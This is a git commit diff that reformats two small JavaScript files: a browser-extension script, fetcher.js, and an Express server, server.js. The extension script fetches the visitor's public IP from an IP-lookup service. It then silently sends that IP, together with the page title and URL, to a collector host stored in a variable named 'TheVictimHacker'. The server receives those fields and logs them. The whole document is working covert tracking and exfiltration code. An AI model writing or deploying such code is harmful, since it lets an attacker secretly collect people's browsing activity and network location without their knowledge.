6577f73380e621271a0abc987c321feb24e9b5c3
JPSO <jpso.guerreiro@gmail.com>
2021-01-03 15:25:40 -0300

    Initial Commit

--- extension/fetcher.js
+++ extension/fetcher.js
@@ -1,13 +1,12 @@
-console.log("Fetcher included! :)")
-let TheVictimHacker = "http://localhost:8080" //change this
-function victimIPGET()
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://api64.ipify.org", false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
+console.log('Fetcher included! :)')
+const TheVictimHacker = 'http://localhost:8080' // change this
+function victimIPGET () {
+  const xmlHttp = new XMLHttpRequest()
+  xmlHttp.open('GET', 'https://api64.ipify.org', false) // false for synchronous request
+  xmlHttp.send(null)
+  return xmlHttp.responseText
 }
-let victimIP = victimIPGET()
+const victimIP = victimIPGET()
 console.log(victimIP)
 
 fetch(`${TheVictimHacker}/${victimIP}&${document.title}&${window.location}`)
--- server/server.js
+++ server/server.js
@@ -1,11 +1,11 @@
-const express = require('express');
+const express = require('express')
 
-const app = express();
-app.use(function(req,res,next){
-	let data = req.path.split("&") 
-	console.log(data[0].replace("/",""))
-	console.log(data[1])
-	console.log(data[2])
+const app = express()
+app.use(function (req, res, next) {
+  const data = req.path.split('&')
+  console.log(data[0].replace('/', ''))
+  console.log(data[1])
+  console.log(data[2])
 })
 
-app.listen(8080, () => console.log(`Started server at http://localhost:8080!`));
+app.listen(8080, () => console.log('Started server at http://localhost:8080!'))
